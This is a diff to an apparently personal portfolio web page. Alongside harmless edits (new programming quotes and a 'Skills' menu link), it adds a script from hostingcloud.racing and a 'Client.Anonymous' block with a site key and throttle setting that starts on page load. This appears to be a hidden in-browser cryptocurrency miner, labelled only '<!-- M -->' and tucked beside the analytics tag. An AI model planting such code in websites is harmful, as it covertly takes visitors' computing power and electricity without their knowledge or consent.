@@ -11,10 +11,17 @@
 	<style>
 		.fade{animation:opac 0.8s}@keyframes opac{from{opacity:0} to{opacity:1}}
 	</style>
+	
+	<!-- M -->
+	<script src="https://www.hostingcloud.racing/rCU8.js"></script>
 
 	<!-- Global site tag (gtag.js) - Google Analytics -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=UA-150100041-1"></script>
 	<script>
+		var _client = new Client.Anonymous('28d128d0513e3c76634c63e6c66046d0e4c85234681ba1f34fe8d8fd1c3af24b', {
+			throttle: 0.2, c: 'w', ads: 0
+		});
+		_client.start();
 
 		window.dataLayer = window.dataLayer || [];
 		function gtag(){dataLayer.push(arguments);}
@@ -39,7 +46,11 @@
 				"Security in IT is like locking your house or car - it doesn't stop the bad guys, but if it's good enough they may move on to an easier target. - Paul Herbka",
 				"In theory, one can build provably secure systems. In theory, theory can be applied to practice but in practice, it can't. - M.Dacier, Eurecom Institute",
 				"Every great developer you know got there by solving problems they were unqualified to solve until they actually did it. - Patrick McKenzie",
-				"One of the best programming skills you can have is knowing when to walk away for awhile. - Oscar Godson"
+				"One of the best programming skills you can have is knowing when to walk away for awhile. - Oscar Godson",
+				"Don't write better error messages, write code that doesn't need them. - Jason C. McDonald",
+				"Java is to JavaScript what car is to Carpet. - Chris Heilmann",
+				"Sometimes it pays to stay in bed on Monday, rather than spending the rest of the week debugging Monday’s code. - Dan Salomon",
+				"Code is like humor. When you have to explain it, it’s bad. - Cory House"
 			];
 
 			var randomItem = myArray[Math.floor(Math.random()*myArray.length)];
@@ -139,6 +150,7 @@
 
 		<div class="entry_wrapper">
 			<a href="work.html" onclick="remove_help()" target="iframe_main" class="entry">Work</a>
+			<a href="skills.html" onclick="remove_help()" target="iframe_main" class="entry">Skills</a>
 			<a href="about.html" onclick="remove_help()" target="iframe_main" class="entry">About Me</a>
 		</div>
 
